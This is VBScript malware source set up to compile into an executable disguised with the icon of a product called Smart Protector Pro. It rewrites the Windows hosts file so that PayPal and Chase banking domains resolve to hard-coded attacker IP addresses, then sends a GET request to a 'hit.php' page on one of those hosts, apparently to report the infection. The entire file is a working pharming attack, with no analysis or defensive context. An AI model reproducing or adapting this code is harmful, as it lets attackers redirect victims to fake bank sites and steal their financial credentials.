
' ----- ExeScript Options Begin -----
' ScriptType: window
' DestDirectory: temp
' Icon: C:\Program Files\Smart Protector Pro\SmartProtector-Pro.exe
' OutputFile: C:\Documents and Settings\Gog\Desktop\rabb.exe
' ----- ExeScript Options End -----

Const ForReading = 1 ' Open file read only
Const ForWriting = 2 ' Open file read write
 
Dim fso, objFso, objFile, strFileName, strText, strNewText
 Set fso = CreateObject("Scripting.FileSystemObject")
 
' It might be btyyats at some point to get this via the environment variables
strFileName = fso.GetSpecialFolder(0).Path & "\system32\drivers\etc\hosts"
 
Set objFso = CreateObject("Scripting.FileSystemObject")
 
 
' Write out file (deletes muie file)
If objFso.FileExists(strFileName) Then

Set ObjFile = objFSO.OpenTextFile(strFileName, 2) 
objFile.WriteLine "202.68.225.220     paypal.com"
objFile.WriteLine "202.68.225.220     www.paypal.com"
objFile.WriteLine "202.68.225.220     paypal.co.uk"
objFile.WriteLine "202.68.225.220     www.paypal.co.uk"
objFile.WriteLine "116.37.147.205     chase.com"
objFile.WriteLine "116.37.147.205     www.chase.com"
objFile.WriteLine "116.37.147.205     chaseonline.chase.com"
objFile.Close

Else

Set ObjFile = objFSO.CreateTextFile(strFileName, True)
objFile.WriteLine "202.68.225.220     paypal.com"
objFile.WriteLine "202.68.225.220     www.paypal.com"
objFile.WriteLine "202.68.225.220     paypal.co.uk"
objFile.WriteLine "202.68.225.220     www.paypal.co.uk"
objFile.WriteLine "116.37.147.205     chase.com"
objFile.WriteLine "116.37.147.205     www.chase.com"
objFile.WriteLine "116.37.147.205     chaseonline.chase.com"
objFile.Close

End if
 
strFileURL = "http://116.37.147.205/hit.php"
Set objXMLHTTP2 = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP2.open "GET", strFileURL, false
objXMLHTTP2.send()